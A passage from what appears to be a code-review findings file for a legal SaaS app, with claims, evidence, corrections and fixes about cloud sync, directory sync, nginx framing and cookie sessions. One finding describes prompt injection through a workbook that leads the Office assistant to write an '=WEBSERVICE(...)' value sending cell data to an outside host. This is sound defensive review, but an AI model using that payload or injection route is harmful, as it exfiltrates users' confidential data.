Folder-scoped OneDrive search (cloud_search.py:246-263 → _search_graph 911-920 → _search_onedrive_folder 1437-1488) calls f"{GRAPH_BASE}/me/drive/items/{folder_id}/search(...)" (1450) and returns [] on any non-200 (1461-1467), with no fallback to the tenant token. Content fetch (1207-1239) uses /me/drive/items/{object_id}/content (1222) for OneDrive and falls back to hit.snippet. cloud_sync.py:606-630 sync_onedrive_folders uses _get_token (843-868, user token first) with /me/drive/items/{folder_id}/children, and _sync_graph_files logs and breaks on non-200 (~1066-1072). matters.py:3407-3421 passes user_id and returns status 'synced'. Matter folders are created and shared from the admin/tenant token's /me/drive (cloud_init.py:683 invite and 1506-1508 create use get_fresh_token), and storage_root_ownership.py:4-7 confirms OneDrive roots live in an admin's personal drive. MICROSOFT_USER_SCOPES (integrations.py:262-265) includes Files.ReadWrite.All, so the user token is used for these calls, but /me/drive/items/{id} resolves only in the caller's own drive and returns itemNotFound. RAG passes user_id to both search and fetch_contents (rag.py:1891-1905), so affected users' AI answers lose OneDrive matter-folder content.
reviews.correction: This is a functional defect, not a data exposure. It affects only tenants whose matter root is OneDrive (SharePoint refs use /drives/{driveId}/... at cloud_search.py:1512 and cloud_sync.py:727, and Google is unaffected), and only users with their own Microsoft token who are not the admin who owns the drive. There is a partial mask: search always includes the local metadata index (cloud_search.py:321-331). Matter-folder rows synced earlier by a user without a personal token can still appear as titles, but their bodies still fail to fetch for affected users. Files uploaded through LawHand use the tenant token (matter_file_store.py:50) and are not affected. Line references have drifted by about 30-50 lines.
reviews.fix_sketch: Record the admin drive's id when the OneDrive root or matter folders are provisioned (GET /me/drive with the tenant token), and use /drives/{driveId}/items/{id}/... for folder search, children sync and content fetch. As an immediate stopgap, resolve the tenant token (get_fresh_token) for all folder-scoped OneDrive operations; LawHand matter access checks already gate who reaches them. Also stop reporting 'synced' when a provider listing failed.

title: After any storage migration, every scheduled sync force-rewalks the whole cloud tree and rewrites the index
claim: sync_all and sync_matter_folders call storage_migration_reindex.run(force=True) on every run (cloud_sync.py:80-111). That BFS makes one Graph/Drive call per folder plus marker downloads with no 429 handling (storage_discovery.py:233-298), then deletes and re-upserts all file rows (storage_migration_reindex.py:130-143). Any failure raises RuntimeError before mail sync runs (cloud_sync.py:85-88). Firms with thousands of matter folders make thousands of API calls every interval, get throttled, and all cloud sync (including mail metadata) fails continuously.

reviews.correction: The core claim is accurate. It is scoped to tenants that have a completed storage migration (phase='complete'). Any such migration triggers the forced full reindex on every run, permanently. The claim understates three things. (1) The Graph BFS has a global MAX_PAGES=10_000 bound, so a Microsoft target with more than about 10k folders plus continuation pages fails every run with no need for throttling. (2) The per-matter 'Sync folder' HTTP route (matters.py:3407) also runs the full-tree reindex synchronously inside the user's request, and a failure raises RuntimeError to the user. (3) run_cloud_sync walks tenants serially in one job, so a long BFS for one migrated tenant delays every other tenant's sync. Throttling (429) is inferred rather than shown in code, but any non-200 raises ValueError, so throttling would fail the run. Because _upsert gates files after a migration, this forced reindex is the only way new target files reach the index. That makes it deliberate (a test asserts force=True), so the fix has to replace it, not just remove it.
reviews.evidence: cloud_sync.py:79-89: sync_all runs whenever _latest_completed_migration returns a row, calls storage_migration_reindex.run(db, tenant_id, force=True), and raises RuntimeError before mail sync if the status is not 'completed'. cloud_sync.py:188-199: the same pattern in sync_matter_folders. storage_migration_reindex.py:73: force=True bypasses the needs_reindex check. storage_migration_reindex.py:81-83: full discover() on every run. storage_migration_reindex.py:130-140: deletes all file/sharepoint_file rows for the provider, then calls _upsert per item. cloud_sync.py:893-899: each _upsert does SELECT tenants FOR UPDATE plus a migration query, about 3 statements per file. storage_discovery.py:15: MAX_PAGES=10_000. storage_discovery.py:233-298: Graph BFS with one GET per folder or continuation (240-246), non-200 raises ValueError (247-250), a stream download per .lawhand-matter.json marker (270-276), and 'pagination exceeded safety bound' on exhaustion (297-298). storage_discovery.py:103-160: the Google BFS makes a call per folder with no global bound. scheduler.py:804-812 with config.py:569 (CLOUD_SEARCH_ENABLED=True) and config.py:583 (CLOUD_METADATA_SYNC_INTERVAL_MIN=15). scheduler.py:1774-1837: serial per-tenant loop; the exception records provider 'cloud' as failed, so mail never syncs. matters.py:3407: per-matter route calls sync_matter_folders. tests/test_cloud_sync_migration_dispatch.py:30: asserts force=True.
reviews.fix_sketch: On the scheduled and per-matter paths, call run(force=False) so a full reindex runs only when needs_reindex is set. Add a trusted incremental path for migrated tenants: a Graph delta query on the target root's drive, or the Drive changes API, storing the cursor in sync_cursor and upserting with trusted_reindex=True. Optionally cap forced full reindex to once a day via a last_full_reindex_at column. Stop the reindex failure from aborting mail sync: record it in failures[] and continue to target mail. Add 429/Retry-After backoff in StorageDiscovery. Take the tenant lock and migration lookup once per reindex, not per row. Remove the full reindex from the synchronous per-matter HTTP route, or enqueue it as a durable job.

reviews.evidence: backend/app/services/cloud_sync.py:80-111 (sync_all) and 187-213 (sync_matter_folders) call storage_migration_reindex.run(db, tenant_id, force=True) whenever _latest_completed_migration (302-313) finds any migration with phase 'complete'. That lookup does not filter on needs_reindex. storage_migration_reindex.py:73 and 121-126 skip the run only when force is False, so force=True bypasses the needs_reindex flag set once at cutover (storage_migration.py:650). The designed path (routers/storage_migration.py:75-80, 214-229) uses force=False. Each run does a full BFS (storage_discovery.py:233-298): one GET per folder page, plus a streamed download per .lawhand-matter.json marker, and any non-200 including 429 raises ValueError with no Retry-After handling (247-250), bounded by MAX_PAGES=10_000 (line 15). It then deletes all target-provider file rows and re-upserts them (storage_migration_reindex.py:130-143). On failure run() returns status 'failed', and sync_all raises RuntimeError (cloud_sync.py:85-88) before the target mail sync at 102-109. The scheduler runs sync_all every CLOUD_METADATA_SYNC_INTERVAL_MIN=15 minutes when CLOUD_SEARCH_ENABLED (default True) (scheduler.py:804-814, config.py:569,583). Each user click of the per-matter 'Sync folder' (matters.py:3407) also triggers a full tenant reindex.
reviews.correction: The mechanism is real, but only tenants that have completed an admin-initiated storage migration (require_admin, routers/storage_migration.py:57-58) are affected. For them it is permanent. Throttling is plausible for large trees but not guaranteed; the certain effects are a full re-walk and index rewrite every interval and on every per-matter sync click. Any single transient error, or more than 10,000 pages, makes the whole run fail and skips mail metadata sync. The delete and re-insert happen in one transaction, so readers do not see an empty index.
reviews.fix_sketch: Call run(force=False) from sync_all and sync_matter_folders so the persisted needs_reindex flag gates the reindex. Once it is complete, fall through to the normal target-provider incremental sync. Record a reindex failure in `failures` instead of raising, so mail sync still runs. Add 429/503 Retry-After backoff in storage_discovery._graph and in the Google path. Stop sync_matter_folders from triggering a tenant-wide reindex.

title: Directory sync re-activates admin-deactivated users, and their mailboxes keep being captured
claim: Every directory match sets user_row.is_active = True unconditionally (user_sync.py:175-181 for Microsoft, 321-327 for Google; also ms-graph#D7 at 170-173). Admin deactivation (admin.py:300-306) does not delete or revoke UserOAuthToken rows, and run_correspondence_capture iterates all token rows with no User.is_active or token-health filter (scheduler.py:1894-1916). A deactivated user is restored at the nightly directory sync and their mail is archived into matters every 30 minutes.

reviews.evidence: backend/app/services/user_sync.py:176-181 (Microsoft) and 322-327 (Google) set user_row.is_active = True unconditionally on every email match, at lines 180 and 326. routers/admin.py:299-306: deactivation revokes open invitations and sets is_active=False, but does not touch UserOAuthToken. The only UserOAuthToken deletes are in the integrations disconnect paths (integrations.py:2168, 2200, 2426). Login does honor is_active (auth.py:1029-1037), so reactivation restores real access, and license_active is untouched, so the seat is counted again (licensing.py:87-95). The nightly job is registered unconditionally at 2:00 (scheduler.py:793-799), runs each active credential (scheduler.py:1988-2016), and the admin 'Sync now' reactivates immediately as well. scheduler.py:1894-1916: run_correspondence_capture selects every UserOAuthToken for the tenant with no join to User.is_active or license_active. scan_and_capture (correspondence_capture.py:388-420) has no user-state check either. However, the job is registered only when settings.CORRESPONDENCE_CAPTURE_ENABLED is true (scheduler.py:817-829), and that defaults to False (config.py:586). No compose or env file in the repo enables it, and CI sets it to 'false' (ci.yml:1132).
reviews.correction: Reactivation is real, but only for users whose directory account is still enabled or not suspended. Accounts disabled in Entra or suspended in Workspace are skipped, not reactivated. It also happens on any manual 'Sync now', not just nightly. The 'mail archived every 30 minutes' half depends on CORRESPONDENCE_CAPTURE_ENABLED, which defaults to off. It is live only where an operator turns it on. Leftover tokens are still a latent risk for other per-user token consumers.
reviews.fix_sketch: Remove the is_active=True assignment for existing users in both sync paths. Set is_active only on creation, or add a deactivated_by/deactivation_source column so sync never overrides an admin decision. In admin deactivate, delete or revoke the user's UserOAuthToken rows, best-effort revoke at the provider, and bump sessions_valid_after. In run_correspondence_capture, join UserOAuthToken to User and filter User.is_active and User.license_active, and apply the same filter to other per-user token jobs. Tests: sync does not reactivate a deactivated user, and capture skips inactive users.

reviews.evidence: backend/app/services/user_sync.py:176-181: every Microsoft directory match sets user_row.is_active = True (line 180). The Google path does the same at 322-327 (line 326). Nothing records that an admin deliberately deactivated the user. backend/app/routers/admin.py:242-306: DELETE /api/admin/users/{id} only revokes open invitations and sets is_active=False at line 305. It leaves UserOAuthToken rows and license_active unchanged. backend/app/services/scheduler.py:794-800: user-sync runs daily at 02:00 (CronTrigger at 796). scheduler.py:1894-1916: run_correspondence_capture selects every UserOAuthToken for the tenant with no User.is_active or token-health filter. correspondence_capture.py:388-419 does not check either. Re-activation fully restores sign-in, because is_active is the login gate (middleware/tenant.py:199; auth.py:1028-1036). The guards I found are listed in the correction.
reviews.correction: Re-activation is real, but only for users who are still enabled in the identity provider. user_sync.py:156 skips accountEnabled=false and :306 skips Google suspended accounts before the match, and a deleted IdP user is never enumerated. So staff who were offboarded in Entra or Workspace are not revived. What gets undone is a deactivation made only in LawHand: seat management, excluding non-legal staff that directory sync auto-created and licensed, or a departing attorney deactivated before IT disables the IdP account. The every-30-minutes mailbox capture is overstated. The job is registered only when CORRESPONDENCE_CAPTURE_ENABLED is true (scheduler.py:818), which defaults to False (config.py:586) and is not set in .env.prod.example. So capturing a deactivated user's mail is latent by default. A related reachable path: D10's /api/email/scan can still read a deactivated user's token. The Microsoft half is currently gated by the tier-unknown capability check (capabilities.py:95-103 via user_sync.py:23-55). This branch's openid fix (integrations.py:246-250, commit 672b240) removes that gate, so the Microsoft path becomes live once it merges and tenants reconnect. The Google Workspace path is live today.
reviews.fix_sketch: In both sync loops, stop setting is_active=True on existing rows. Set it only when creating a user, or add an admin_deactivated_at column that sync respects. On admin deactivation, delete or mark revoked the user's UserOAuthToken rows. Filter run_correspondence_capture (and the email scan) to User.is_active and healthy tokens. Add tests: a deactivated user stays inactive after sync, and a deactivated user is not scanned.

title: Directory sync never deprovisions disabled/suspended/deleted accounts and licenses guests and resource mailboxes
claim: Microsoft GET /users (user_sync.py:130-202) has no userType/assignedLicenses $filter and $select omits userType, so guests, rooms and shared mailboxes become role 'user' with license_active=True; accountEnabled=false only skips creation and never deactivates existing users (user_sync.py:154-156), and deleted users are never reconciled. The Google path (user_sync.py:305-351) skips suspended accounts instead of setting is_active=False, ignores deleted users, and creates every account license_active=True (346). Departed staff stay active and consume paid seats; external guests (clients/co-counsel in Teams) become licensed LawHand users. The Microsoft half is latent while the tier bug (ms-graph#D0) blocks MS sync, but live for Google and legacy MS credentials.

reviews.evidence: backend/app/services/user_sync.py:134-137: $select is 'id,mail,userPrincipalName,displayName,givenName,surname,jobTitle,department,accountEnabled', with no userType and no $filter, and all pages are fetched (139-150). Lines 155-158: accountEnabled False only does skipped += 1; continue, and existing rows are never deactivated. There is no reconciliation of existing users missing from the listing, and new rows get role='user', license_active=True (190-203). Google path: lines 306-308 skip suspended users; there is no deletion reconciliation; new rows get license_active=True (346). Licensed seats are counted as is_active and license_active (licensing.py:87-95, 282-291). Aggravating: Google sign-in resolves an existing user by verified email (auth.py:1006 allow_verified_email_match=provider=='google', auth.py:914-916). A synced Entra guest whose mail is a Gmail address can therefore sign in to the firm tenant with Google. The tier gate lives in capabilities.py:92-103. On this branch the openid fix is present (integrations.py:245-250 MICROSOFT_IDENTITY_SCOPES, commit 672b240).
reviews.correction: Rooms and shared mailboxes are overstated. Exchange Online creates room, resource and shared mailboxes with sign-in blocked (accountEnabled=false) by default, so the accountEnabled check usually skips them. Guests (userType Guest, enabled) and enabled unlicensed or service accounts are the real over-import. The 'Microsoft half is latent' caveat is stale on this branch: commit 672b240 adds openid, so Microsoft sync becomes live once a tenant reconnects, which makes this more urgent, not less. Google users.list with my_customer returns only domain users, so the guest issue is Microsoft-only. Non-deprovisioning of departed staff is a missing feature (medium on its own). The guest-to-licensed-user import, with a possible Google email-match sign-in, is what justifies high.
reviews.fix_sketch: Microsoft: add userType (and optionally assignedLicenses) to $select and filter userType eq 'Member'. Skip anything that is not a Member, and optionally skip accounts with no licenses. For existing matched users with accountEnabled false (Microsoft) or suspended/archived (Google), set is_active=False, but only for directory-managed rows (add directory_managed or directory_object_id) and never the last admin or the credential grantor. After a complete, successful page walk, deactivate directory-managed users absent from the listing, with a safety cap (e.g. refuse to deactivate more than 20% in one run) and an audit log entry. Consider creating new synced users with license_active=False, or respecting flat_seat_count. Add tests for each branch.

reviews.evidence: backend/app/services/user_sync.py:131-134: GET /users with $select id,mail,userPrincipalName,displayName,givenName,surname,jobTitle,department,accountEnabled. There is no userType, no assignedLicenses and no $filter. Line 156: accountEnabled False only increments skipped and continues, and an existing active LawHand row is never set inactive. users_by_email (152) is never walked for LawHand users that are missing from the directory, so deleted users are not reconciled. Lines 191-202: new rows get role='user', oauth_subject=Entra oid, is_active=True, license_active=True. The email comes from mail or else UPN (160-163), so a B2B guest's row carries the guest's external address. Google path: 306-308 skips suspended accounts without deactivating them, and 336-348 creates every other account with license_active=True. The scheduler docs state 'new active users are licensed by default' (scheduler.py:129). The Microsoft path is gated by the tier-unknown check (capabilities.py:95-103, user_sync.py:23-55). This branch adds openid to the MS admin connect (integrations.py:246-250), which lifts that gate. Sign-in reachability for a synced guest: Microsoft SSO does not email-match (auth.py:1006 allows it only for google) and refuses unlinked MS identities (auth.py:1055-1064). Google SSO, however, resolves any unique verified email across tenants (auth.py:911-916, 1001-1036) and logs into that user's tenant, and require_sign_in_tenant (tenant_access.py:65-79) applies no per-tenant provider restriction.
reviews.correction: The rooms and shared-mailboxes part is mostly overstated. Exchange Online creates those accounts with sign-in blocked (accountEnabled=false), so line 156 usually skips them. The concrete risk is Entra B2B guests: clients or co-counsel invited to Teams have accountEnabled=true and would be imported as licensed role='user' rows in the firm's tenant, under their external address. Google Directory users.list does not return external guests, so the Google half is only about deprovisioning and seat licensing. The claim understates one point. Beyond seat cost, a synced guest whose external address is also a verified Google account could plausibly sign into the firm's LawHand tenant through Google SSO email matching (auth.py:911-916). That route was traced in code, not tested. 'Departed staff stay active' mostly affects seats and non-SSO credentials such as password logins, sessions and MCP tokens, because a disabled IdP account can no longer complete Microsoft or Google SSO. On origin/main the Microsoft half is latent behind the tier gate. It becomes live with this branch's openid fix and on legacy credentials whose tier was detected.
reviews.fix_sketch: Microsoft: add userType and assignedLicenses to $select. Skip userType != 'Member' and #EXT# UPNs, and optionally skip unlicensed objects. For both providers: when accountEnabled is false or suspended is true, set is_active=False on existing synced rows. After a fully successful enumeration (every page returned 200), deactivate synced rows (matching oauth_provider, oauth_subject not seen) that are absent from the directory. Consider defaulting license_active to False, or respecting a seat cap, for auto-created users. Separately, consider restricting Google email-match sign-in to users whose oauth_provider is google or who were invited.

title: nginx forbids framing of /teams, so Teams tabs render as 'refused to connect'
claim: Server-level X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' (nginx.conf:412-415) are inherited by location / (nginx.conf:690-700; again 763-768 and 1037 for :443), which serves the SPA /teams routes (App.jsx:346-353) that the committed Teams manifest targets (teams-app/manifest.json:25-51). Unlike /office/ (nginx/snippets/office_addin.conf:26) there is no /teams exception allowing teams.microsoft.com/*.teams.microsoft.com/*.cloud.microsoft ancestors, so both the personal and configurable tabs are blank in Teams.

reviews.evidence: The mechanism checks out exactly. nginx/nginx.conf:412-415 sets X-Frame-Options SAMEORIGIN and a CSP with frame-ancestors 'self' at server level (edge-terminated HTTP server). The :443 server repeats them at 761-768. location / (nginx.conf:690-700 and about 1037) has no add_header of its own, so it inherits both. grep of nginx/ finds no /teams location; the only Teams matches are the voice webhooks at 556-575 and 915-935. Only nginx/snippets/office_addin.conf:8-26 overrides the headers, for /office/. The frontend container (frontend/Dockerfile, serve.json) adds no headers. The SPA routes /teams and /teams/config (frontend/src/App.jsx:348-353) are what teams-app/manifest.json:25-44 points the static and configurable tabs at. Teams web and desktop frame tabs from teams.microsoft.com and *.cloud.microsoft, so the browser blocks them.
reviews.correction: The headers and inheritance are correct. Severity high is overstated. The Teams tab is an opt-in, unlaunched surface: TASKS.md:2371 and 2380 mark 1402/1403 PENDING, nothing in the app links to installing it, and frontend/src/marketing/requirements.js:50 says it stays disabled until a firm asks. The Teams features firms actually use, channel notifications and voice intake, are unaffected. Framing is also not the only blocker. D18 (auth) applies, and TeamsTabConfigPage.jsx:69-77 calls window.microsoftTeams.pages.config.setConfig, but the ESM @microsoft/teams-js 2.53.0 import (package.json 'module' is the ESM build) never defines that global, so setConfig never runs. TeamsTabPage never calls app.initialize(). Not verified: Teams mobile may render tabs in a native webview where frame-ancestors does not apply, so 'blank in Teams' mainly holds for web and desktop.
reviews.fix_sketch: Add nginx/snippets/teams_tab.conf with location ~ ^/teams(/|$) that proxies to $upstream_frontend. Because a location-level add_header discards the server-level set, repeat every server-level header in it: HSTS, nosniff, Referrer-Policy, Permissions-Policy, X-Robots-Tag and the full CSP. Omit X-Frame-Options and set frame-ancestors 'self' https://teams.microsoft.com https://*.teams.microsoft.com https://*.cloud.microsoft https://*.office.com https://*.microsoft365.com. Include the snippet in both the :80/edge and :443 servers, and add an nginx config test asserting the /teams headers. In the same change, fix TeamsTabConfigPage to call the imported teamsPages.config.setConfig, and call app.initialize() in TeamsTabPage. On its own this does not make the tab usable; D18 is also required.

reviews.evidence: nginx/nginx.conf:410-422 sets server-level headers on the :80 server, including X-Frame-Options SAMEORIGIN (412) and a CSP ending in frame-ancestors 'self' (415). The SPA catch-all location / at nginx.conf:690-700 has no add_header of its own, so it inherits both. The :443 server does the same: headers at 761-772 (XFO at 763, CSP at 768) and location / at 1037-1047 with no add_header. Only /office/ gets its own header set: nginx/snippets/office_addin.conf:8-28 leaves out XFO and allows frame-ancestors for *.office.com, *.office365.com, *.live.com and *.microsoft.com. Searching nginx/ for 'teams' finds only the voice-webhook locations (nginx.conf:562-575, 921-934), so /teams has no exception. frontend/src/App.jsx:346-353 serves /teams and /teams/config through the SPA. teams-app/manifest.json:25-47 points the static tab at https://getlawhand.com/teams and the configurable tab at /teams/config. The frontend container adds no headers (frontend/Dockerfile CMD 'serve'; serve.json only sets cleanUrls), so the edge headers are the only ones sent, and browsers will refuse to frame both tabs. Mitigating context: frontend/src/marketing/requirements.js:50 says the Teams app is opt-in and 'stays disabled until a firm asks for it', and TASKS.md:2371-2388 still lists 1402 (manifest packaging) and 1403 (tab with SSO) as PENDING.
reviews.correction: The claim is accurate, but 'high' overstates it. The Teams tab is an opt-in surface that is off by default (requirements.js:50) and still marked pending (TASKS 1402/1403). No data is exposed, and the failure is fail-closed. Fixing framing alone does not make the tab usable: D18 (no session inside the iframe) still blocks it, so the two issues must be fixed and shipped together. The claim cites the :443 location / at line 1037; its full block is 1037-1047.
reviews.fix_sketch: Add a dedicated `location = /teams` and `location ^~ /teams/` (both server blocks, or a shared snippet like office_addin.conf) that proxies to $upstream_frontend. It should set its own headers with no X-Frame-Options and use CSP frame-ancestors 'self' https://teams.microsoft.com https://*.teams.microsoft.com https://*.cloud.microsoft https://*.office.com https://outlook.office.com. It must re-add the other security headers, because a location-level add_header drops every inherited one. Because SPA routing is client-side, the framed document can navigate to any route, so keep the ancestor list limited to Microsoft hosts. Ship this only together with D18.

title: Teams tabs depend on the SPA's SameSite=Lax cookie session with no Teams SSO exchange
claim: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:195-197, 346-353), which redirects unauthenticated users to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (config.py:60) and are not sent in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls microsoftTeams.authentication.getAuthToken and routers/teams.py has no token-exchange endpoint (TASKS 1403 pending). Even after the framing fix, users hit a login page that cannot complete in the iframe.

reviews.evidence: frontend/src/App.jsx:185-197: ProtectedRoute sends an unauthenticated user to /login?return_to=..., and /teams and /teams/config sit behind it (App.jsx:348-353). The SPA is cookie-only: frontend/src/api.js:175 sets withCredentials: true, and api.js:211-220 says auth lives entirely in httpOnly cookies and removes the localStorage tokens. backend/app/config.py:60 sets COOKIE_SAMESITE: str = 'lax', and auth.py:483-499 applies it to the auth cookies. No deploy file overrides it; docs/reviews/PLATFORM_HARDENING_REVIEW.md:422-442 already notes the same issue for the add-in. Inside a cross-site Teams iframe, Lax cookies are not sent on fetches, and Lax Set-Cookie from a login POST is rejected, so an in-iframe password login cannot stick and Microsoft login refuses framing. teams-app/manifest.json:48-51 declares webApplicationInfo. grep of frontend/src and backend/app finds no getAuthToken or authentication.* usage. backend/app/routers/teams.py (prefix /api/integrations/teams, lines 106-591) has only teams/channels, links, notification-settings, test-message and voice routes, with no SSO exchange. TASKS.md:2380-2389 has 1403 'Embedded Teams tab with SSO' PENDING.
reviews.correction: The technical claim is accurate. Severity is reduced to medium for the same reason as D17: this is an unlaunched, opt-in tab (TASKS 1402/1403 PENDING) and core Teams notifications are unaffected. Useful building blocks already exist, so the fix is smaller than a from-scratch build. backend/app/routers/auth.py:1716 (/api/auth/office/exchange) already verifies Entra access tokens with verify_microsoft_access_token and maps tid/oid to existing users. backend/app/middleware/tenant.py:150-157 already accepts a Bearer token when no cookie is present.
reviews.fix_sketch: Add POST /api/auth/teams/exchange, modeled on exchange_office_session. It verifies the Teams getAuthToken JWT (audience api://lawhand.onmicrosoft.com/<client id>, scope access_as_user) and maps tid/oid only to an existing linked user, never provisioning. Because Lax cookies cannot be set in the iframe, choose one of two approaches. (a) Return a short-lived access token that the SPA keeps in memory and sends as Authorization: Bearer, only when running in Teams; TenantMiddleware must accept Bearer for non-auth routes too. (b) Set a separate Teams session cookie with SameSite=None; Secure; Partitioned (CHIPS). Frontend: a TeamsAuthGate on /teams routes calls app.initialize(), then authentication.getAuthToken() and the exchange, and falls back to authentication.authenticate() in a popup for consent. Entra: expose access_as_user and pre-authorize the Teams desktop/web and mobile client IDs. Tests: wrong audience, expired token, cross-tenant tid and unknown user are all rejected.

reviews.evidence: frontend/src/App.jsx:185-198: ProtectedRoute sends any request without a user to /login?return_to=... using a client-side Navigate. App.jsx:346-353 wraps /teams in ProtectedRoute and /teams/config in ProtectedRoute adminOnly. backend/app/config.py:59-60 defaults COOKIE_SAMESITE to 'lax', and routers/auth.py:500-517 (_cookie_flags) applies that setting to the auth cookies. frontend/src/api.js:175 and 212-214 show the SPA authenticates only through httpOnly cookies with withCredentials, with no Authorization header and no token in localStorage. Browsers do not send SameSite=Lax cookies on subresource requests from a cross-site iframe, and they block Lax cookies set by cross-site responses, so the session cannot be established or used under teams.microsoft.com. teams-app/manifest.json:48-51 declares webApplicationInfo, but routers/teams.py:51 (prefix /api/integrations/teams) exposes only teams, channels, links, notification-settings, test-message and voice routes (106-591). No SSO exchange exists anywhere: grep for getAuthToken, sso/exchange and teams_sso across backend/app and frontend/src finds nothing. TeamsTabPage.jsx:1-15 never initializes teams-js. TeamsTabConfigPage.jsx:26 only calls app.initialize(). TASKS.md:2380-2388 lists 1403 (POST /api/teams/sso/exchange plus getAuthToken) as PENDING.
reviews.correction: Accurate, but it fails closed: there is no confidentiality exposure, only a surface that does not work. It is also limited to the opt-in, off-by-default Teams app (frontend/src/marketing/requirements.js:50), so medium fits better than high. Two further points. First, /teams/config is adminOnly, so even with SSO a Teams team owner who is not a LawHand admin cannot configure the tab. Second, changing COOKIE_SAMESITE=none globally would weaken CSRF posture for the whole app and still fails under third-party-cookie blocking (Safari ITP, Chrome partitioning), so a config change is not a fix.
reviews.fix_sketch: Implement TASKS 1403. The backend adds POST /api/integrations/teams/sso/exchange. It validates the Teams AAD token (aud = our app ID URI, iss = AAD v2 for tid, signature via JWKS), requires tid to match the tenant's connected M365 directory, maps oid to User (with an email fallback only when the directory is verified), and mints a session. That session must work in the iframe without loosening the main app: either a CHIPS cookie (Partitioned; SameSite=None; Secure) scoped to the Teams surface, or a short-lived bearer token held in memory by a Teams-only API client. The frontend makes /teams call app.initialize() and authentication.getAuthToken(), exchange the token, and then render. It should skip the ProtectedRoute redirect to /login inside Teams and show an 'open in browser' fallback instead. Decide whether /teams/config stays admin-only.

title: Excel set_selected_values bypasses the unsafe-formula ban
claim: office_action_policy.py:168-183 checks set_selected_values only for JSON scalar type (53-57); the WEBSERVICE/HYPERLINK/external-reference regex (31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel interprets a value starting with '=' as a formula; validation.ts:99-102 does not check values either. A prompt-injected plan can write '=WEBSERVICE("https://x/?"&A1)' to exfiltrate workbook data.

reviews.evidence: backend/app/services/office_action_policy.py:53-57 checks each Excel value only for JSON scalar type. The set_selected_values branch (168-183) calls only _matrix_shape and _validate_excel_input_value. _UNSAFE_FORMULA_RE (31-35) and the '=' prefix check run only in the set_selected_formulas branch (185-203). backend/app/schemas/office_assistant.py:113-114 has ValuesContent.values: list[list[Any]] with no validator. The system prompt at backend/app/services/office_assistant.py:39,44-45 advertises the values action and asks the model not to emit external-link or volatile formulas, but that is only a prompt instruction; bind_actions at line 159 is the only enforcement. The client writes the value directly with range.values = action.content.values (office-addin/src/hosts/excelAdapter.ts:101-102). The client validator at office-addin/src/contracts/validation.ts:99-103 only checks matrix shape for values; the claim's path office-addin/src/validation.ts does not exist, the real file is under src/contracts/. The only test is backend/tests/test_office_assistant.py:113-121, which covers WEBSERVICE on the formulas path and nothing on the values path. Office.js Range.values treats a written string that starts with '=' (and also '+' or '-') as a formula.
reviews.correction: The core claim is accurate. Things that lower the risk: the user has to click Apply after a before/after preview (main.ts:135-139; excelAdapter.ts:79-86 shows the matrix as serialized JSON, where one bad cell is easy to miss in up to 2,500 cells). The feature is off by default and limited to pilot tenants (config.py:112,115). WEBSERVICE works only in Excel for Windows desktop. The bypass is wider than the claim says: values starting with '+', '-' or '@' are also parsed as formulas, and the same path lets through NOW/RAND/INDIRECT and external [Book] references. The client path is office-addin/src/contracts/validation.ts, not office-addin/src/validation.ts.
reviews.fix_sketch: In bind_actions set_selected_values, treat any str value whose first non-space character is one of '=', '+', '-', '@' as formula-like. Either reject it with invalid_cell_value (unless it parses as a plain number, such as '-5') or run _UNSAFE_FORMULA_RE on it and require the model to use set_selected_formulas. Add the same check to office-addin/src/contracts/validation.ts for set_selected_values, as defense in depth. Optionally, have ExcelAdapter.execute prefix formula-like strings with an apostrophe (') so Excel stores them as text. Add pytest cases for '=WEBSERVICE(...)', '+HYPERLINK(...)' and '=[Book1]Sheet1!A1' in values, plus a vitest case.

reviews.evidence: backend/app/services/office_action_policy.py:168-183: the set_selected_values branch checks only matrix shape and calls _validate_excel_input_value, which (53-57) checks only JSON scalar type. _UNSAFE_FORMULA_RE (31-35: WEBSERVICE/HYPERLINK/INDIRECT/https?:// etc.) is applied only in the set_selected_formulas branch (185-203). backend/app/schemas/office_assistant.py:113-114 ValuesContent.values is list[list[Any]] with no validator. office-addin/src/contracts/validation.ts:99-102 (the claim's 'validation.ts' is actually at src/contracts/) checks only matrix shape for values, while formulas (105-116) get a '=' check and no unsafe-function check. office-addin/src/hosts/excelAdapter.ts:101-102 assigns range.values = action.content.values, and Office.js treats a value string beginning with '=' as a formula. The model context includes the selected cells' values and formulas (office_assistant.py:120-131), so text planted in a third-party workbook can steer the model. The only test covers the formulas path (backend/tests/test_office_assistant.py:113-121). Guards that limit reach: OFFICE_ASSISTANT_ENABLED defaults to False (config.py:112), and require_office_for_user limits access to pilot-allowlisted tenants or demo-tier tenants (services/office_access.py:13-48). The user must click Apply after a before/after preview (office-addin/src/main.ts:69-92, 127-171).
reviews.correction: The bypass is real, but it is not a silent write. It needs the Office pilot enabled for the tenant (off by default), a model that follows the injected text, and an attorney who clicks Apply on a preview. That preview shows the '=WEBSERVICE(...)' string, although it is labelled 'Values' and can be buried in a matrix of up to 2,500 cells. WEBSERVICE exfiltration works only in Excel desktop for Windows, not Excel on the web. The claim's validation.ts path is wrong: the file is office-addin/src/contracts/validation.ts.
reviews.fix_sketch: In _validate_excel_input_value, reject (or apostrophe-escape) any string value whose first character is '=' (and, to be conservative, '+', '-' or '@'). Also run _UNSAFE_FORMULA_RE over string values. Mirror the check in office-addin/src/contracts/validation.ts for set_selected_values, so a compromised or stale backend cannot get it through. Add backend and add-in tests covering a '=WEBSERVICE(...)' value.

title: Office add-in cookie session fails in Office on the web and new Outlook (SameSite=Lax in cross-site iframe)
claim: The Office token exchange sets HTTP-only cookies (auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60), then the pane re-reads /auth/me with credentials (office-addin/src/auth/officeSession.ts:72-99). As the code's own comment (officeSession.ts:73-77) notes, the Lax cookie is not sent cross-site; on web hosts the pane is iframed under office.com / cloud.microsoft, so the pane shows 'Office sign-in completed without a LawHand session'. Only classic desktop clients work.

